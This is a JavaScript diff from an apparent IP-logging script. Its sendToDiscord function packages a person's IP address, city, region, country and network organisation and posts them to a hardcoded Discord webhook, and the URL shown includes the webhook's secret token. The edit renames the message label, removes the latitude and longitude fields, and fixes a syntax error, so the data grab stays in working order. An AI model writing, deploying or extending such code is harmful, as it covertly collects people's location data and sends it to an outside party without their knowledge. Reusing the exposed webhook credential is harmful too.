@@ -14,8 +14,8 @@ async function sendToDiscord(ipInfo) {
     const webhookURL = 'https://discord.com/api/webhooks/1249563638977531925/uKfEV4WY6UJVbUv8bx-OC6d1ZPFYe6MewF6Qmeb21dkajwjie1i4A5P9cnFn0JFdLqNM';
     
     const data = {
-        content: `Data Information:\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nOrg: ${ipInfo.org}\nLocation: Latitude: ${latitude}, Longitude: ${longitude}`
-    },
+        content: `IP Information:\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nOrg: ${ipInfo.org}`
+    };
     try {
         const response = await fetch(webhookURL, {
             method: 'POST',
